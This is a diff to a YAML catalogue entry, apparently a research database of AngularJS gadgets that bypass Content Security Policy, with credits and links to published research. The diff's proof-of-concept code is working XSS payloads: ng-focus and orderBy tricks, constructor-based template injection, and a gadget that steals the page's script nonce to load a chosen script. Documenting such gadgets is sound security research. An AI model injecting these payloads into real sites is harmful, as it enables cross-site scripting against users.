@@ -2,9 +2,48 @@
 description: AngularJS - HTML enhanced for web apps!
 github: angular/angular.js
 gadgets:
-  Latest:
+  1.4.5&≥1.6.0 (1):
     authors:
       - twitter:garethheyes
+    tags:
+      - chrome-browser
+      - firefox-browser
+      - safari-browser
+      - any-tag
+      - custom-attr
+      - wh-host-csp
+      - nonce-csp
+      - before-lib-load
+    pocs:
+      - description: |
+          Many other variants have been found by [@garethheyes](https://x.com/garethheyes) (see Related Links).
+        code: |
+          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js"></script>
+
+          <!-- user input -->
+          <div ng-app><input autofocus ng-focus="$event.view.alert(1)"></div>
+      - description: |
+          As long as `eval`, `Function`, `setTimeout`... isn't called, it doesn't requires `unsafe-eval`. Due to that, it is possible to retrieve the nonce and load a script.
+        code: |
+          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js"></script>
+
+          <!-- user input -->
+          <div ng-app>
+            <img src=x ng-on-error='
+              doc=$event.target.ownerDocument;
+              a=doc.defaultView.document.querySelector("[nonce]");
+              b=doc.createElement("script");
+              b.src="[current-location]/assets/xss/index.js";
+              b.nonce=a.nonce; doc.body.appendChild(b)'>
+          </div>
+    links:
+      - https://portswigger.net/research/ambushed-by-angularjs-a-hidden-csp-bypass-in-piwik-pro
+      - https://portswigger.net/research/angularjs-csp-bypass-in-56-characters
+      - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-csp-bypasses
+      - https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/
+  1.6.0 (2):
+    authors:
+      - twitter:cure53berlin
     tags:
       - chrome-browser
       - firefox-browser
@@ -16,47 +55,15 @@ gadgets:
       - unsafe-eval-csp
       - before-lib-load
     pocs:
-      - code: |
-          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js"></script>
-
-          <!-- user input -->
-          <div ng-app><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></div>
-      - code: |
-          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js"></script>
-
-          <!-- user input -->
-          <div ng-app><input autofocus id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'></div>
-      - code: |
-          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js"></script>
-
-          <!-- user input -->
-          <div ng-app><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></div>
-    links:
-      - https://portswigger.net/research/ambushed-by-angularjs-a-hidden-csp-bypass-in-piwik-pro
-      - https://portswigger.net/research/angularjs-csp-bypass-in-56-characters
-      - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-csp-bypasses
-  ≥1.6.0:
-    authors:
-      - twitter:cure53berlin
-    tags:
-      - chrome-browser
-      - firefox-browser
-      - safari-browser
-      - any-tag
-      - custom-attr
-      - wh-host-csp
-      - nonce-csp
-      - before-lib-load
-    pocs:
-      - description: Starting `1.6.0`, [AngularJS](https://github.com/angular/angular.js) has removed the sandbox that prevents the execution of arbitrary code. Due to this, it can be used to execute arbitrary code even if the `Content Security Policy` (CSP) doesn't allow `unsafe-eval` (see Related Links).
+      - description: Starting `1.6.0`, [AngularJS](https://github.com/angular/angular.js) has removed the sandbox that prevents the execution of arbitrary code.
         code: |
-          <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
+          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
 
           <!-- user input -->
           <div ng-app>{{constructor.constructor('alert(document.domain)')()}}</div>
       - description: This shorten version have been found by [@garethheyes](https://x.com/garethheyes) and [@LewisArdern](https://x.com/LewisArdern).
         code: |
-          <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
+          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
 
           <!-- user input -->
           <div ng-app>{{$on.constructor('alert(document.domain)')()}}</div>
